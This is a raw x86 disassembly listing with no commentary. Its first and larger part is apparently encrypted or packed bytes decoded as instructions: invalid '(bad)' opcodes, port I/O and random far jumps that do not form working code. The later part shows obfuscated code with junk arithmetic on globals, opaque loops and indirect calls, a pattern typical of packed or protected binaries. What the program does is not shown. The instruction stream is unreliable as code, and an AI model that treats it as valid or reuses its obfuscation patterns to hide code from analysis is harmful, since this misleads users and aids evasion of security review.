  403016:	shl    edx,1
  403018:	add    DWORD PTR [eax-0x6c],0x8c799ad5
  40301f:	in     al,0xa2
  403021:	cmp    BYTE PTR [ecx-0x25f3603c],0x2e
  403028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403029:	test   eax,0xaadbf8fe
  40302e:	xor    eax,DWORD PTR [ecx-0x70ce668b]
  403034:	test   DWORD PTR [ebp+esi*4-0x30d4c224],0x43a4616d
  40303f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403040:	xor    DWORD PTR ds:0x3b0be1ac,eax
  403046:	cwde   
  403047:	push   ebx
  403048:	or     eax,0x296ed298
  40304d:	ror    DWORD PTR [ebx-0x674ffbe5],1
  403053:	lods   eax,DWORD PTR ds:[esi]
  403054:	popf   
  403055:	dec    edx
  403056:	jno    0x403085
  403058:	mov    al,BYTE PTR [ebx]
  40305a:	add    DWORD PTR ds:0x8fdea7a4,edi
  403060:	mov    bl,0xf
  403062:	mov    ds,WORD PTR [edi]
  403064:	rcl    DWORD PTR [ecx+esi*2+0x58],1
  403068:	lahf   
  403069:	xor    al,0x49
  40306b:	in     al,dx
  40306c:	ror    BYTE PTR [edx+0x7dfd83c2],0x20
  403073:	xchg   ebx,eax
  403074:	das    
  403075:	mov    edx,0xc7f6d165
  40307a:	out    dx,al
  40307b:	fidiv  DWORD PTR [edx-0x7361cbf3]
  403081:	or     DWORD PTR [ecx],0x8701f95b
  403087:	sub    DWORD PTR [esi-0x274e9c02],edx
  40308d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40308e:	sub    eax,DWORD PTR [ebx]
  403090:	adc    DWORD PTR [edx+0x4e072d1e],edx
  403096:	outs   dx,BYTE PTR ds:[esi]
  403097:	fbstp  TBYTE PTR [edx+0x257bc18e]
  40309d:	pop    ebp
  40309e:	pop    ss
  40309f:	push   es
  4030a0:	cmc    
  4030a1:	mov    edx,0xab850167
  4030a6:	xchg   edx,eax
  4030a7:	ins    DWORD PTR es:[edi],dx
  4030a8:	lods   eax,DWORD PTR ds:[esi]
  4030a9:	and    eax,0x2e465e6
  4030ae:	dec    esi
  4030af:	loopne 0x403053
  4030b1:	and    BYTE PTR [esi+ecx*4+0x31],ch
  4030b5:	dec    eax
  4030b6:	pushf  
  4030b7:	mov    bh,BYTE PTR [eax-0x32]
  4030ba:	jg     0x40303d
  4030bc:	shl    BYTE PTR [eax+edi*4+0x314d3f23],1
  4030c3:	pusha  
  4030c4:	dec    esp
  4030c5:	int3   
  4030c6:	xor    eax,0xa7b03e23
  4030cb:	push   DWORD PTR [esp+ecx*1]
  4030ce:	hlt    
  4030cf:	and    al,0x5f
  4030d1:	xor    dl,BYTE PTR [esi]
  4030d3:	jmp    0x40308f
  4030d5:	xchg   edi,eax
  4030d6:	xchg   ebx,eax
  4030d7:	cmp    bl,BYTE PTR [ebx+0x34cb9f92]
  4030dd:	stc    
  4030de:	mov    DWORD PTR [esi+0x50e4ca92],esi
  4030e4:	jle    0x4030bd
  4030e6:	test   BYTE PTR [eax+0x62b1e990],bh
  4030ec:	jbe    0x403161
  4030ee:	or     eax,0xd6918a90
  4030f3:	pop    ebp
  4030f4:	push   es
  4030f5:	ins    BYTE PTR es:[edi],dx
  4030f6:	add    edi,DWORD PTR [ebp-0x7]
  4030f9:	stc    
  4030fa:	and    BYTE PTR [esi],0x3b
  4030fd:	adc    DWORD PTR [ebx],0x16ff493a
  403103:	fld    st(6)
  403105:	lock popf 
  403107:	fadd   QWORD PTR [ebx+0x74]
  40310a:	call   0x6a5c4346
  40310f:	data16 fwait
  403111:	rcr    eax,cl
  403113:	push   es
  403114:	std    
  403115:	in     eax,0xdd
  403117:	mov    DWORD PTR [eax-0x71],ecx
  40311a:	push   ss
  40311b:	push   ebp
  40311c:	inc    ebx
  40311d:	out    dx,al
  40311e:	xor    ah,BYTE PTR [ebx+eax*2-0x6b]
  403122:	test   al,0x11
  403124:	in     eax,0xf
  403126:	jae    0x4030d4
  403128:	xchg   ebp,eax
  403129:	pop    ebx
  40312a:	loopne 0x403133
  40312c:	xor    cl,BYTE PTR [ebx-0x5a]
  40312f:	xchg   esp,eax
  403130:	mov    eax,ds:0x89a0d83f
  403135:	fs pop ebp
  403137:	cwde   
  403138:	scas   eax,DWORD PTR es:[edi]
  403139:	icebp  
  40313a:	mov    ch,0xd7
  40313c:	loop   0x4030d4
  40313e:	mov    edi,0xbd286d57
  403143:	xchg   BYTE PTR [esi+0x6d],dl
  403146:	fadd   QWORD PTR [ebp-0x1bcc2db0]
  40314c:	loope  0x40318e
  40314e:	stos   BYTE PTR es:[edi],al
  40314f:	outs   dx,DWORD PTR ds:[esi]
  403150:	adc    cl,ah
  403152:	mov    ebx,0xbb312edb
  403157:	mov    WORD PTR [ecx],fs
  403159:	nop
  40315a:	jnp    0x403188
  40315c:	and    BYTE PTR [ebx-0x38fd12e6],cl
  403162:	arpl   WORD PTR [edx+0x4a],bp
  403165:	into   
  403166:	push   0xffffffde
  403168:	xor    DWORD PTR [ebx-0x752ab63f],esi
  40316e:	cmp    ch,0x39
  403171:	and    ah,BYTE PTR [ebx+0x7a]
  403174:	(bad)  
  403175:	cmp    eax,0x7fb2cfa8
  40317a:	push   ds
  40317b:	or     ebx,DWORD PTR ds:0xd2f27400
  403181:	cmp    al,0xb4
  403183:	xlat   BYTE PTR ds:[ebx]
  403184:	sub    bl,BYTE PTR [eax]
  403186:	mov    ecx,0x99c7b26c
  40318b:	into   
  40318c:	mov    cl,0x30
  40318e:	add    DWORD PTR [esi+0x20b4cbbf],eax
  403194:	lock mov eax,0x856fde6e
  40319a:	das    
  40319b:	cmp    dl,bl
  40319d:	jno    0x403134
  40319f:	inc    eax
  4031a0:	fs call 0xaf15d7ac
  4031a6:	imul   edx,DWORD PTR [ebp+0x7d66a44e],0x7b
  4031ad:	loope  0x4031c5
  4031af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031b0:	xchg   esp,eax
  4031b1:	push   ecx
  4031b2:	sub    edi,ebx
  4031b4:	ds add eax,0x542378cb
  4031ba:	push   ds
  4031bb:	aaa    
  4031bc:	adc    BYTE PTR [edx-0x20],ah
  4031bf:	std    
  4031c0:	lods   al,BYTE PTR ds:[esi]
  4031c1:	rol    bh,cl
  4031c3:	lods   eax,DWORD PTR ds:[esi]
  4031c4:	shl    DWORD PTR [esi-0x17046fdc],cl
  4031ca:	inc    esi
  4031cb:	scas   eax,DWORD PTR es:[edi]
  4031cc:	popa   
  4031cd:	add    eax,esi
  4031cf:	pop    eax
  4031d0:	mov    ecx,0x7a21b99a
  4031d5:	push   esp
  4031d6:	pop    es
  4031d7:	fldenv [eax+0x5d]
  4031da:	xor    eax,0xa3842609
  4031df:	push   ecx
  4031e0:	clc    
  4031e1:	idiv   DWORD PTR [eax+ecx*2-0x33]
  4031e5:	(bad)  
  4031e6:	(bad)  
  4031e7:	mov    ?,WORD PTR [ebx]
  4031e9:	jmpw   0xedb
  4031ed:	dec    eax
  4031ee:	and    eax,0x13a3a1b7
  4031f3:	sub    BYTE PTR [ecx+edx*1],dh
  4031f6:	push   ebp
  4031f7:	arpl   di,ax
  4031f9:	jae    0x4031ab
  4031fb:	or     al,bh
  4031fd:	(bad)  
  4031fe:	cwde   
  4031ff:	lea    edi,[ebx-0xa]
  403202:	mov    eax,0x32d82f21
  403207:	adc    BYTE PTR [ebp-0x2e998b93],bl
  40320d:	xchg   esp,eax
  40320f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403210:	lods   eax,DWORD PTR ds:[esi]
  403211:	cmc    
  403212:	xchg   ecx,eax
  403213:	fs sbb al,0x55
  403216:	ja     0x403208
  403218:	cmp    DWORD PTR [ebx+ecx*4-0x40],0xffffff92
  40321d:	xlat   BYTE PTR ds:[ebx]
  40321e:	push   ecx
  40321f:	int    0x8
  403221:	sbb    bh,dl
  403223:	fs imul esi,esp,0xfffffffd
  403227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403228:	jae    0x4031e9
  40322a:	lea    eax,gs:[ecx]
  40322d:	aaa    
  40322e:	inc    edi
  40322f:	sbb    al,0xa4
  403231:	scas   al,BYTE PTR es:[edi]
  403232:	lahf   
  403233:	not    ebp
  403235:	cdq    
  403236:	inc    esp
  403237:	inc    ebp
  403238:	test   eax,0x3f1eedd7
  40323d:	jno    0x40320a
  40323f:	out    dx,al
  403240:	push   ebx
  403241:	por    mm7,QWORD PTR [ebx]
  403244:	(bad)  
  403246:	adc    BYTE PTR [eax+0x51394348],bh
  40324c:	inc    ebx
  40324d:	mov    bl,0x11
  40324f:	das    
  403250:	and    DWORD PTR [edx-0x71],ebp
  403253:	push   esi
  403254:	stos   BYTE PTR es:[edi],al
  403255:	in     al,0xb9
  403257:	adc    BYTE PTR [ebx],bl
  403259:	mov    ebp,0xc2fc87cc
  40325e:	or     ch,BYTE PTR [edx+0x1a]
  403261:	push   esp
  403262:	xchg   ebp,eax
  403263:	adc    eax,0xa42d14aa
  403268:	mov    dl,0x2c
  40326a:	dec    esi
  40326b:	inc    eax
  40326c:	add    BYTE PTR [eax],cl
  40326e:	mov    al,0xcc
  403270:	cli    
  403271:	or     ah,BYTE PTR [eax-0x5d]
  403274:	mov    edx,0x2d63d632
  403279:	fistp  WORD PTR [esi-0x247555c2]
  40327f:	pop    es
  403280:	add    eax,0x904f1c9a
  403285:	lods   al,BYTE PTR ds:[esi]
  403286:	retf   
  403287:	xchg   ecx,eax
  403288:	adc    DWORD PTR [esp+eiz*2],0x74
  40328c:	retf   
  40328d:	cmp    cl,BYTE PTR [ecx+edi*2+0x4c]
  403291:	add    BYTE PTR [edi+0x5a],dh
  403294:	adc    BYTE PTR [ebp-0x6c],dh
  403297:	jp     0x4032a9
  403299:	cmp    bl,al
  40329b:	cld    
  40329c:	pop    ebp
  40329d:	xchg   DWORD PTR [esi+ecx*8+0x24e0ba9c],ebx
  4032a4:	lea    ecx,[edi+0x3bf97800]
  4032aa:	sbb    al,0x2d
  4032ac:	inc    ecx
  4032ad:	dec    edi
  4032ae:	int    0x22
  4032b0:	inc    esi
  4032b1:	or     bh,dh
  4032b3:	in     al,dx
  4032b4:	(bad)  
  4032b5:	xor    esp,DWORD PTR [eax]
  4032b7:	stos   BYTE PTR es:[edi],al
  4032b8:	ins    DWORD PTR es:[edi],dx
  4032b9:	sbb    BYTE PTR [ebx-0x5915bf76],ch
  4032bf:	inc    edx
  4032c0:	out    0x18,eax
  4032c2:	xchg   esi,eax
  4032c3:	and    eax,0xcf608584
  4032c8:	fcom   DWORD PTR [eax+0x72]
  4032cb:	xor    al,0x49
  4032cd:	xchg   ebx,eax
  4032ce:	ret    0xfd77
  4032d1:	iret   
  4032d2:	sbb    al,0x5e
  4032d4:	rol    BYTE PTR [esi+edi*4-0x1aeade81],0x92
  4032dc:	adc    ebx,DWORD PTR [esi-0x5afa070e]
  4032e2:	mov    eax,DWORD PTR [eax+edi*1]
  4032e5:	in     eax,dx
  4032e6:	dec    ebx
  4032e7:	loope  0x403321
  4032e9:	xchg   ebp,eax
  4032ea:	pop    esi
  4032eb:	and    dh,BYTE PTR [edi]
  4032ed:	push   0x45
  4032ef:	hlt    
  4032f0:	dec    bx
  4032f2:	dec    esp
  4032f3:	stos   DWORD PTR es:[edi],eax
  4032f4:	pop    edi
  4032f5:	sti    
  4032f6:	mov    esp,0x5bcf81d
  4032fb:	popfw  
  4032fd:	adc    dh,BYTE PTR [edx+0x16]
  403300:	in     al,0xb8
  403302:	(bad)  
  403303:	repnz pop eax
  403305:	lods   eax,DWORD PTR ds:[esi]
  403306:	out    dx,eax
  403307:	mov    ch,0x32
  403309:	xlat   BYTE PTR ds:[ebx]
  40330a:	(bad)  
  40330b:	call   0x5f72bf6b
  403310:	add    bh,BYTE PTR [edx-0x14fc474b]
  403316:	push   edi
  403318:	jns    0x403346
  40331a:	xlat   BYTE PTR ds:[ebx]
  40331b:	mov    ss,WORD PTR [edi]
  40331d:	div    BYTE PTR [edi-0x31]
  403320:	mov    bl,0xb1
  403322:	pop    esi
  403323:	dec    ebp
  403324:	imul   ebp,DWORD PTR [ebp+0x1d691673],0x7bb5b1f
  40332e:	mov    al,bl
  403330:	je     0x40330b
  403332:	adc    DWORD PTR [ebx],eax
  403334:	pusha  
  403335:	sub    cl,bh
  403337:	push   ss
  403338:	in     eax,dx
  403339:	and    al,0x0
  40333b:	lea    esi,[ecx]
  40333d:	imul   ecx,esi,0x1e
  403340:	stos   BYTE PTR es:[edi],al
  403341:	mov    edx,0x2e31dbeb
  403346:	mov    ebx,0x3362cec9
  40334b:	dec    ebp
  40334c:	iret   
  40334d:	neg    BYTE PTR [ebp-0x45]
  403350:	sbb    eax,0x9eb59c47
  403355:	mov    dh,0x16
  403357:	hlt    
  403358:	stos   BYTE PTR es:[edi],al
  403359:	add    edx,DWORD PTR [ecx+edi*1+0x5f]
  40335d:	hlt    
  40335e:	cvtpi2ps xmm5,QWORD PTR [ecx]
  403361:	cmp    DWORD PTR [edi+0x60],ecx
  403364:	pop    es
  403365:	out    0xde,eax
  403367:	stos   DWORD PTR es:[edi],eax
  403368:	into   
  403369:	inc    edx
  40336a:	xor    eax,0x236e4018
  40336f:	xlat   BYTE PTR ds:[ebx]
  403370:	xchg   ebp,eax
  403371:	shl    ecx,1
  403373:	pushf  
  403374:	cld    
  403375:	xchg   ebx,eax
  403376:	test   BYTE PTR [ecx-0x70],dl
  403379:	fcom   DWORD PTR ds:0xbafd4324
  40337f:	nop
  403380:	lds    eax,FWORD PTR [edx-0x592111ff]
  403386:	into   
  403387:	dec    ebp
  403388:	sub    ch,BYTE PTR [ebp-0x265169d2]
  40338e:	fsub   QWORD PTR [esi-0x46]
  403391:	int3   
  403392:	cmp    dl,BYTE PTR [ebp-0x4475d023]
  403398:	test   DWORD PTR [esi],edi
  40339a:	js     0x403395
  40339c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40339d:	xor    BYTE PTR [esi],al
  40339f:	fistp  WORD PTR [ebx-0x3]
  4033a2:	es mov cl,0xb3
  4033a5:	imul   DWORD PTR [edi+edi*2]
  4033a8:	or     BYTE PTR ds:0x6632d809,bh
  4033ae:	sbb    bh,dh
  4033b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033b1:	arpl   WORD PTR [eax+0x62],sp
  4033b4:	cwde   
  4033b5:	push   0xea3c19ad
  4033ba:	pop    ss
  4033bb:	lods   al,BYTE PTR ds:[esi]
  4033bc:	xor    eax,0x72915ba1
  4033c1:	daa    
  4033c2:	mov    BYTE PTR [ebp+0x78],bl
  4033c5:	dec    esp
  4033c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033c7:	rcl    ecx,1
  4033c9:	cmp    al,0xd1
  4033cb:	add    al,0x2e
  4033cd:	lock jo 0x403444
  4033d0:	or     BYTE PTR [eax],ah
  4033d2:	(bad)  
  4033d3:	mov    ds:0x4917f1f6,al
  4033d8:	pusha  
  4033d9:	mov    al,ds:0x320119e9
  4033de:	xor    bl,bl
  4033e0:	repnz push ecx
  4033e2:	push   ds
  4033e3:	sbb    ebp,DWORD PTR [ebx+eiz*4]
  4033e6:	sbb    ch,BYTE PTR [esi]
  4033e8:	push   ecx
  4033e9:	or     al,0x90
  4033eb:	add    BYTE PTR [esi-0x4cc40b46],0x87
  4033f2:	aam    0x93
  4033f4:	les    edi,FWORD PTR [edi-0x25]
  4033f7:	test   BYTE PTR [esi+0x70cff57c],cl
  4033fd:	lods   al,BYTE PTR ds:[esi]
  4033fe:	fbld   TBYTE PTR [edx-0x59]
  403401:	push   cs
  403402:	adc    al,ah
  403404:	push   ss
  403405:	adc    al,0x6f
  403407:	cmp    dh,BYTE PTR es:[ebx+ecx*2+0x6b317125]
  40340f:	std    
  403410:	mov    gs,WORD PTR [eax+edx*8]
  403413:	out    0x91,eax
  403415:	dec    edx
  403416:	push   ecx
  403417:	cmp    DWORD PTR [ebx-0x4c],ebp
  40341a:	xlat   BYTE PTR ds:[ebx]
  40341b:	mov    ah,0x20
  40341d:	mov    dh,0x35
  40341f:	icebp  
  403420:	mov    dh,0xc4
  403422:	sbb    esi,DWORD PTR [ebx-0x2b]
  403425:	dec    ebx
  403426:	xchg   edx,eax
  403427:	test   ebx,0xb8d7bd79
  40342d:	popf   
  40342e:	and    ax,0x577f
  403432:	inc    eax
  403433:	das    
  403434:	cmp    edx,ebp
  403436:	jo     0x40347f
  403438:	xchg   BYTE PTR [ecx+0x39684018],cl
  40343e:	xchg   esp,eax
  40343f:	or     al,0x9d
  403441:	sti    
  403442:	sti    
  403443:	aam    0x24
  403445:	mov    dh,0x7b
  403447:	xchg   edx,eax
  403448:	inc    esi
  403449:	in     al,0x6c
  40344b:	sbb    BYTE PTR [eax+0x7a],0x9d
  40344f:	popa   
  403450:	mov    esp,0xff4a1671
  403455:	das    
  403456:	pop    es
  403457:	and    DWORD PTR [ecx+esi*8-0x3838b26b],edx
  40345e:	mov    ebx,0x165e3a5a
  403463:	and    al,BYTE PTR [esi-0x11ef3afe]
  403469:	jno    0x403411
  40346b:	into   
  40346c:	jmp    0xffeee257
  403471:	inc    ecx
  403472:	add    DWORD PTR [ebx-0x14],0xffffffc2
  403476:	fs jl  0x4034c7
  403479:	mov    esp,0x83f01863
  40347e:	call   0xd580:0x85bc8b1b
  403485:	xchg   DWORD PTR [ebx],eax
  403487:	icebp  
  403488:	mov    al,0xe
  40348a:	mov    al,0x71
  40348c:	dec    eax
  40348d:	inc    edi
  40348e:	fistp  QWORD PTR [ecx-0xe0f9317]
  403494:	test   eax,0xa0502af7
  403499:	dec    ebp
  40349a:	jmp    0xda81:0xc680567a
  4034a1:	or     DWORD PTR [edi-0x300ab614],ebx
  4034a7:	test   BYTE PTR [edi+0x7c],dl
  4034aa:	xor    DWORD PTR [esi+0x1c],ebp
  4034ad:	cwde   
  4034ae:	lods   al,BYTE PTR ds:[esi]
  4034af:	add    ah,bh
  4034b1:	out    0xde,eax
  4034b3:	cld    
  4034b4:	cmp    eax,0x4dddd5d0
  4034b9:	sbb    DWORD PTR [ecx-0x88c98e8],esi
  4034bf:	test   BYTE PTR [edi-0x647ba8e7],dl
  4034c5:	scas   eax,DWORD PTR es:[edi]
  4034c6:	xchg   ebp,eax
  4034c7:	pop    es
  4034c8:	xchg   ebx,eax
  4034c9:	xchg   esi,esp
  4034cb:	(bad)  
  4034cc:	ja     0x4034f6
  4034ce:	daa    
  4034cf:	push   edx
  4034d0:	lds    edx,FWORD PTR [esi+0x45]
  4034d3:	(bad)  
  4034d4:	pop    ecx
  4034d5:	mov    ds:0x51cc2cb7,eax
  4034da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034db:	fcomp  st(5)
  4034dd:	(bad)  
  4034df:	xchg   esp,eax
  4034e0:	mov    edx,0x2734359e
  4034e5:	ret    
  4034e6:	push   ebp
  4034e7:	mov    ah,0x12
  4034e9:	into   
  4034ea:	xchg   edi,eax
  4034eb:	or     bh,BYTE PTR [ebx-0x7e9725f6]
  4034f1:	inc    esp
  4034f2:	add    ch,bl
  4034f4:	test   DWORD PTR [ecx],esp
  4034f6:	out    0xa4,al
  4034f8:	cmp    eax,0x576fc12a
  4034fd:	scas   eax,DWORD PTR es:[edi]
  4034fe:	cmp    esp,DWORD PTR [edi-0x7040f109]
  403504:	fdiv   DWORD PTR fs:[edx-0x29c9d5f4]
  40350b:	mov    cl,0x16
  40350d:	cdq    
  40350e:	ret    
  40350f:	mov    cs,WORD PTR [ebx+ebx*8]
  403512:	push   ebp
  403513:	fmulp  st(4),st
  403515:	cmp    DWORD PTR [edx-0x75720a0f],eax
  40351b:	sti    
  40351c:	push   ss
  40351d:	mov    esi,0xd3f9190f
  403522:	out    0x7e,eax
  403524:	sub    al,0x6c
  403526:	jmp    ebp
  403528:	xchg   ebp,eax
  403529:	pop    ss
  40352a:	int3   
  40352b:	add    ebx,DWORD PTR [esi]
  40352d:	pop    edi
  40352e:	adc    eax,0xb98834d1
  403533:	aaa    
  403534:	pusha  
  403535:	sbb    DWORD PTR [edi],esp
  403537:	or     esi,eax
  403539:	test   esp,0x3acf948b
  40353f:	inc    eax
  403540:	dec    edx
  403541:	stos   DWORD PTR es:[edi],eax
  403542:	pop    esp
  403543:	mov    eax,ds:0xee0165b4
  403548:	rcr    BYTE PTR [edi*1+0x3024d3cf],cl
  40354f:	dec    ebx
  403550:	stos   BYTE PTR es:[edi],al
  403551:	mov    ah,0xb
  403553:	adc    al,0x11
  403555:	inc    ebx
  403556:	jmp    0xd912:0xa562b65a
  40355d:	mov    ah,0xfc
  40355f:	jae    0x4035d6
  403561:	bound  eax,QWORD PTR ds:0x5d7b9d1a
  403567:	rol    DWORD PTR [edx],0xd8
  40356a:	push   ss
  40356b:	test   BYTE PTR [eax+0x74],0x25
  40356f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403570:	mov    eax,ds:0xa55423e
  403575:	sbb    eax,0xf8631097
  40357a:	jmp    0x486504
  40357f:	push   cs
  403580:	enter  0x6fd9,0x4c
  403584:	fisttp DWORD PTR [ebx+0x46ca7806]
  40358a:	mov    ebp,0xb1962f99
  40358f:	mov    dh,0x75
  403591:	inc    eax
  403592:	mov    bl,BYTE PTR ss:[eax-0x3e]
  403596:	outs   dx,BYTE PTR ds:[esi]
  403597:	push   edi
  403598:	sub    esp,DWORD PTR ds:0x17b0ae1b
  40359e:	icebp  
  40359f:	and    BYTE PTR [edi+ebx*1-0x6ee6b6e3],bl
  4035a6:	adc    BYTE PTR [edx+0xc],ch
  4035a9:	ret    0x32fb
  4035ac:	sub    DWORD PTR [esi+0x619e7927],eax
  4035b2:	bound  ecx,QWORD PTR [ecx+0x21247f4a]
  4035b8:	or     ah,ah
  4035ba:	cmp    esp,DWORD PTR [ebp+0x63d36701]
  4035c0:	push   es
  4035c1:	cmp    al,0x87
  4035c3:	dec    esi
  4035c4:	sbb    al,0xcd
  4035c6:	mov    WORD PTR [edx],gs
  4035c8:	mov    DWORD PTR [eax+0x3a5a0bf0],ecx
  4035ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035cf:	pop    es
  4035d0:	xchg   BYTE PTR [edx-0x76206e23],al
  4035d6:	in     al,dx
  4035d7:	retf   
  4035d8:	stos   DWORD PTR es:[edi],eax
  4035d9:	in     eax,dx
  4035da:	inc    esp
  4035db:	xor    DWORD PTR [ebx+0x22],edi
  4035de:	mov    eax,0x6e89a063
  4035e3:	jg     0x40365d
  4035e5:	mov    ebx,0xfb416184
  4035ea:	jae    0x403599
  4035ec:	loope  0x40366d
  4035ee:	das    
  4035ef:	pop    ss
  4035f0:	arpl   si,bp
  4035f2:	imul   edx,DWORD PTR [ebx],0xf8d9880f
  4035f8:	in     al,dx
  4035f9:	jae    0x403584
  4035fb:	pop    edi
  4035fc:	push   cs
  4035fd:	sbb    BYTE PTR [esi-0x2ce1bd4f],bl
  403603:	sbb    bh,0x9f
  403606:	iret   
  403607:	sbb    al,BYTE PTR [ebx]
  403609:	adc    eax,eax
  40360b:	stc    
  40360c:	out    0x2a,eax
  40360e:	int3   
  40360f:	xchg   DWORD PTR [ebx],ecx
  403611:	jo     0x4035bc
  403613:	out    dx,al
  403614:	mul    BYTE PTR [edx-0x68f6ab8a]
  40361a:	jp     0x4035c6
  40361c:	jmp    0x8e49b2dd
  403621:	mov    DWORD PTR [ebp-0x40],eax
  403624:	xor    eax,0x2e62
  403629:	mov    eax,DWORD PTR [ebp-0x3c]
  40362c:	mov    DWORD PTR [ebp-0x14],eax
  40362f:	and    DWORD PTR ds:0x42a2de,0x0
  403639:	xor    ecx,ecx
  40363b:	xor    ecx,DWORD PTR ds:0x42a2de
  403641:	inc    ecx
  403642:	mov    DWORD PTR ds:0x42a2de,ecx
  403648:	cmp    DWORD PTR ds:0x42a2de,0xb
  40364f:	ja     0x40368d
  403655:	jmp    0x403666
  40365a:	push   DWORD PTR [ebp-0x10]
  40365d:	push   DWORD PTR [ebp-0x18]
  403660:	call   DWORD PTR ds:0x42a3c2
  403666:	cmp    DWORD PTR ds:0x42a2de,0xa
  40366d:	jne    0x403680
  403673:	mov    ecx,DWORD PTR ds:0x42a2de
  403679:	inc    ecx
  40367a:	mov    DWORD PTR ds:0x42a2de,ecx
  403680:	cmp    DWORD PTR ds:0x42a2de,0x12
  403687:	jb     0x403639
  40368d:	mov    eax,DWORD PTR [ebp-0x14]
  403690:	adc    DWORD PTR ds:0x42a2ee,edx
  403696:	push   0x4
  403698:	pop    ecx
  403699:	or     DWORD PTR ds:0x42a256,0x42a2ba
  4036a3:	sub    ecx,eax
  4036a5:	and    DWORD PTR ds:0x42a2ae,edx
  4036ab:	add    ecx,DWORD PTR [ebp-0x1c]
  4036ae:	sub    DWORD PTR ds:0x42a25a,0x29a3
  4036b8:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  4036bf:	adc    DWORD PTR ds:0x42a2ba,0x27f4
  4036c9:	mov    DWORD PTR [ebp-0x18],ecx
  4036cc:	xor    eax,eax
  4036ce:	xor    eax,DWORD PTR ds:0x42a2c2
  4036d4:	or     DWORD PTR ds:0x42a276,eax
  4036da:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  4036e4:	mov    eax,ds:0x42a27e
  4036e9:	or     DWORD PTR ds:0x42a27a,eax
  4036ef:	mov    eax,DWORD PTR [ebp-0x14]
  4036f2:	mov    DWORD PTR [ebp-0x9c],eax
  4036f8:	adc    DWORD PTR ds:0x42a29a,ecx
  4036fe:	mov    eax,DWORD PTR [ebp-0x18]
  403701:	mov    DWORD PTR [ebp-0x98],eax
  403707:	sbb    DWORD PTR ds:0x42a28a,0x5122
  403711:	mov    eax,DWORD PTR [ebp-0x2c]
  403714:	xor    eax,esi
  403716:	add    eax,edi
  403718:	or     DWORD PTR ds:0x42a27a,0x42a2ea
  403722:	mov    DWORD PTR [ebp-0x94],eax
  403728:	lea    eax,[ebp-0x48]
  40372b:	mov    DWORD PTR [ebp-0x90],eax
  403731:	mov    eax,DWORD PTR [ebp-0xa0]
  403737:	xor    eax,esi
  403739:	sbb    DWORD PTR ds:0x42a2f2,0x42a2da
  403743:	add    eax,edi
  403745:	or     DWORD PTR ds:0x42a2ee,0x42a256
  40374f:	mov    DWORD PTR [ebp-0xa0],eax
  403755:	sub    DWORD PTR ds:0x42a272,0x1d49
  40375f:	lea    eax,[ebp-0xa0]
  403765:	push   eax
  403766:	neg    eax
  403768:	mov    eax,DWORD PTR [ebp+0xc]
  40376b:	sub    DWORD PTR ds:0x42a2aa,0x2c11
  403775:	xor    eax,esi
  403777:	add    eax,edi
  403779:	push   eax
  40377a:	mov    eax,ds:0x42943e
  40377f:	push   0x429394
  403784:	mov    DWORD PTR ds:0x42a286,0x524d
  40378e:	push   DWORD PTR [eax]
  403790:	call   0x40a988
  403795:	xor    edx,edx
  403797:	add    edx,DWORD PTR ds:0x42a29e
  40379d:	and    DWORD PTR ds:0x42a28e,edx
  4037a3:	mov    ebx,DWORD PTR [ebp-0x14]
  4037a6:	mov    eax,DWORD PTR [ebp-0x18]
  4037a9:	mov    DWORD PTR [ebp-0x58],eax
  4037ac:	mov    eax,ds:0x42a306
  4037b1:	mov    edx,DWORD PTR ds:0x42a34e
  4037b7:	sub    edx,eax
  4037b9:	sub    eax,DWORD PTR [eax+edx*1]
  4037bc:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  4037c3:	mov    eax,0xf89c85bb
  4037c8:	mov    DWORD PTR [ebp-0x1c],eax
  4037cb:	xor    DWORD PTR ds:0x42a286,0x37ec
  4037d5:	lea    ecx,[eax-0x16]
  4037d8:	and    DWORD PTR ds:0x42a2e2,0x0
  4037e2:	jmp    0x4037f4
  4037e7:	mov    edx,DWORD PTR ds:0x42a2e2
  4037ed:	inc    edx
  4037ee:	mov    DWORD PTR ds:0x42a2e2,edx
  4037f4:	cmp    DWORD PTR ds:0x42a2e2,0x18
  4037fb:	jae    0x40383b
  403801:	cmp    DWORD PTR ds:0x42a2e2,0x4
  403808:	jge    0x40383b
  40380e:	jmp    0x40381c
  403813:	push   DWORD PTR [ebp-0x14]
  403816:	call   DWORD PTR ds:0x42a3c6
  40381c:	cmp    DWORD PTR ds:0x42a2e2,0x3
  403823:	jne    0x403836
  403829:	mov    edx,DWORD PTR ds:0x42a2e2
  40382f:	inc    edx
  403830:	mov    DWORD PTR ds:0x42a2e2,edx
  403836:	jmp    0x4037e7
  40383b:	mov    DWORD PTR [ebp-0x28],ecx
  40383e:	sub    edx,DWORD PTR ds:0x42a2d6
  403844:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  40384b:	mov    edx,DWORD PTR ds:0x42a38a
  403851:	mov    edx,DWORD PTR [edx]
  403853:	xor    DWORD PTR ds:0x42a29a,edx
  403859:	mov    DWORD PTR [ebp-0x8],eax
  40385c:	mov    eax,DWORD PTR [ebp-0x10]
  40385f:	neg    edx
  403861:	xor    eax,esi
  403863:	mov    edx,0xffcd8d8f
  403868:	sub    edx,eax
  40386a:	mov    eax,ds:0x42a2fe
  40386f:	mov    DWORD PTR [ebp-0xc],edx
  403872:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  403879:	mov    eax,DWORD PTR [ebp-0x8]
  40387c:	mov    DWORD PTR ds:0x42a2ce,0x6d9f
  403886:	mov    DWORD PTR [ebp-0x3c],ebx
  403889:	mov    DWORD PTR ds:0x42a286,0xb52
  403893:	cmp    eax,ecx
  403895:	mov    DWORD PTR ds:0x42a2d2,0x1900
  40389f:	je     0x40a6a8
  4038a5:	xor    DWORD PTR ds:0x42a2b6,edx
  4038ab:	mov    eax,DWORD PTR [ebp-0x10]
